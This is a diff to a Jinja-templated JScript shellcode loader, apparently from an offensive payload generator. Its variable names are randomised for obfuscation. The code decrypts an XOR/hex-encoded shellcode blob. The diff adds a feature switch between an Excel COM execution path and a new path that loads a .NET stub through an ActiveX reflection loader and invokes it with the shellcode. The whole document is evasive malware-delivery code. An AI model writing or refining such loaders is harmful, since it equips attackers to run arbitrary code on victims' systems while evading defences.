@@ -116,6 +116,7 @@ function {{ v.fn_exec }}() {
     for (var {{ v.jsc_lv_ki }} = 0; {{ v.jsc_lv_ki }} < {{ v.jsc_lv_k }}.length; {{ v.jsc_lv_ki }}++) {{ v.jsc_lv_k }}[{{ v.jsc_lv_ki }}] ^= {{ key_tweak }};
     var {{ v.jsc_lv_sc }}  = {{ v.fn_decrypt }}({{ v.fn_hex2arr }}({{ v.var_sc }}), {{ v.jsc_lv_k }});
     {%- endif %}
+    {%- if "ExcelComExec" in feature_names %}
     var jsc_lv_xl, jsc_lv_wb, jsc_lv_vbm, jsc_lv_vbcode;
     var jsc_lv_wsh, jsc_lv_vers, jsc_lv_saved, jsc_lv_vi, jsc_lv_regbase, jsc_lv_regtail, jsc_lv_regdword;
     try {
@@ -178,6 +179,14 @@ function {{ v.fn_exec }}() {
             }
         }
     } catch(_trerr) {}
+    {%- else %}
+    var {{ v.jsc_lv_loader }} = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_sys_refl_asm }}]));
+    var {{ v.jsc_lv_stub }}   = {{ v.fn_hex2arr }}("{{ dotnet_stub_hex }}");
+    var {{ v.jsc_lv_asm }}    = {{ v.jsc_lv_loader }}.Load({{ v.jsc_lv_stub }});
+    var {{ v.jsc_lv_t1 }}     = {{ v.jsc_lv_asm }}.GetType({{ v.fn_build_str }}([{{ v.jsc_stub_loader }}]));
+    var {{ v.jsc_lv_mi }}     = {{ v.jsc_lv_t1 }}.GetMethod({{ v.fn_build_str }}([{{ v.jsc_stub_run }}]));
+    {{ v.jsc_lv_mi }}.Invoke(null, [{{ v.jsc_lv_sc }}]);
+    {%- endif %}
 }
 
 {{ v.fn_exec }}();
